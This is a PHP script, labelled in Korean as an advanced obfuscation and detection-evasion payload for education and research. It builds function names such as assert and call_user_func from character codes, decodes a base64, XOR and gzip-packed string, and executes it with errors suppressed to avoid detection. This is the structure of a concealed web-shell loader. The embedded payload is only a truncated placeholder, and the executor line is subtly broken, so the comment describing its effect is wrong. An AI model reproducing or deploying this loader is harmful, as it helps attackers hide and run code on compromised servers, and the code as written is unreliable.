<?php
// PHP 심화 난독화 및 탐지 우회 페이로드 (교육/연구 목적)

// 1. 변수 이름 난독화 및 동적 생성
$a = 'c'.chr(97).'l'.chr(108).'_u'.chr(115).'e'.chr(114).'_f'.chr(117).'n'.chr(99); // call_user_func
$b = 'a'.chr(115).chr(115).'e'.chr(114).chr(116); // assert
$c = 'e'.chr(120).chr(112).'l'.chr(111).chr(100).'e'; // explode

// 2. 난독화된 함수 실행 (eval 대신 assert 사용)
$exec_func = $a($c, ':', $b); // call_user_func(explode(':', 'assert'), ...) => assert

// 3. 동적 키 생성
$key_part1 = chr(115).chr(101).chr(99);
$key_part2 = 'r'.chr(101).'t';
$dynamic_key = $key_part1 . $key_part2 . '!'; // secret!

// 4. 난독화된 페이로드 (XOR 암호화, Base64, GZ 압축, ROT47 등 다중 레이어 가정)
// 실제 환경에서는 이 문자열이 훨씬 더 길고 복잡합니다.
$obf_payload_advanced = 'Lyo_XORd_c4zU3p0NFzS4f25wNLTMzOKnP0s0vLzE0PUrbTM3XDKy32czNDLzVwTDU2MDA...';

// 5. 복호화/실행 로직을 하나의 함수 내부에 감추기
function decode_and_run($payload, $key, $executor) {
    // 5-1. Base64 디코딩 (역순 난독화를 위해 가장 먼저 실행될 수 있음)
    $data = base64_decode($payload);

    // 5-2. XOR 복호화 함수 정의 (내부에서만 사용)
    $xor_decode = function($data, $key) {
        $out = '';
        for ($i = 0; $i < strlen($data);) {
            for ($j = 0; ($j < strlen($key) && $i < strlen($data)); $j++, $i++) {
                $out .= $data[$i] ^ $key[$j];
            }
        }
        return $out;
    };

    // 5-3. XOR 복호화
    $data = $xor_decode($data, $key);

    // 5-4. Gzip 압축 해제
    $data = @gzinflate($data);

    // 5-5. 최종 실행 (assert 함수 호출을 동적으로 처리)
    if ($data) {
        $executor($data);
    }
}

// 6. 실행
@decode_and_run($obf_payload_advanced, $dynamic_key, $exec_func);
// @를 사용하여 오류 메시지를 숨겨 탐지를 회피합니다.

?>